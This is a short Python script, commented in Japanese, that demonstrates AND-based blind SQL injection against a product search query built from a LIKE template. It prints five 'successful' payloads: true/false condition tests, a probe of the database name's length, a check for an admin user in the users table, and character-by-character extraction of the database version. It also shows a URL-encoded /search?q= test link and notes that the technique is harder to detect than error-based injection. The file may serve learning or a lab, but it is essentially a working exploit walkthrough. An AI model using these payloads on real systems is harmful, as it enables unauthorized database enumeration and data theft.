import urllib.parse

# AND を使った成功例の分析
def analyze_and_injection():
    query_template = "SELECT id, name, description, price, stock, category, image_url FROM products WHERE name LIKE '%{query}%' OR description LIKE '%{query}%'"
    
    print("=== AND を使ったSQLインジェクション成功例 ===\n")
    
    # 成功例1: 条件を追加してTrue/Falseをテスト
    payload1 = "test' AND 1=1 AND 'x'='"
    sql1 = query_template.format(query=payload1)
    print(f"[成功例1] ペイロード: {payload1}")
    print(f"生成SQL: {sql1}")
    print("説明: 'x'=' の部分で次の %' とつながり、'x'='%' となって文字列が閉じられる")
    print("結果: test' AND 1=1 AND 'x'='%' (True条件)")
    print()
    
    # 成功例2: False条件でデータを隠す
    payload2 = "test' AND 1=2 AND 'x'='"
    sql2 = query_template.format(query=payload2)
    print(f"[成功例2] ペイロード: {payload2}")
    print(f"生成SQL: {sql2}")
    print("説明: 1=2 は常にFalseなので結果が表示されない")
    print("結果: test' AND 1=2 AND 'x'='%' (False条件)")
    print()
    
    # 成功例3: 文字列長さテスト
    payload3 = "test' AND LENGTH(database())>5 AND 'x'='"
    sql3 = query_template.format(query=payload3)
    print(f"[成功例3] ペイロード: {payload3}")
    print(f"生成SQL: {sql3}")
    print("説明: データベース名の長さをテストして情報を抽出")
    print("結果: ブラインドSQLインジェクションで情報取得")
    print()
    
    # 成功例4: サブクエリでの存在確認
    payload4 = "test' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 AND 'x'='"
    sql4 = query_template.format(query=payload4)
    print(f"[成功例4] ペイロード: {payload4}")
    print(f"生成SQL: {sql4}")
    print("説明: adminユーザーの存在を確認")
    print("結果: ユーザー存在の確認が可能")
    print()
    
    # 成功例5: 文字列比較でのブラインドインジェクション
    payload5 = "test' AND SUBSTRING(version(),1,1)='1' AND 'x'='"
    sql5 = query_template.format(query=payload5)
    print(f"[成功例5] ペイロード: {payload5}")
    print(f"生成SQL: {sql5}")
    print("説明: データベースバージョンの最初の文字が'1'かテスト")
    print("結果: バージョン情報の文字単位抽出")
    print()
    
    # 実際のURLエンコード例
    print("=== URLエンコード例 ===")
    test_payload = "test' AND 1=1 AND 'x'='"
    encoded = urllib.parse.quote(test_payload)
    print(f"ペイロード: {test_payload}")
    print(f"URLエンコード: {encoded}")
    print(f"テストURL: /search?q={encoded}")
    print()
    
    # 重要なポイント
    print("=== AND インジェクションのポイント ===")
    print("1. 最後に 'x'=' を追加して次の %' と組み合わせる")
    print("2. AND 条件でTrue/Falseを制御")
    print("3. ブラインドSQLインジェクションに適している")
    print("4. 結果の有無で情報を推測")
    print("5. エラーベースより検出されにくい")

if __name__ == "__main__":
    analyze_and_injection()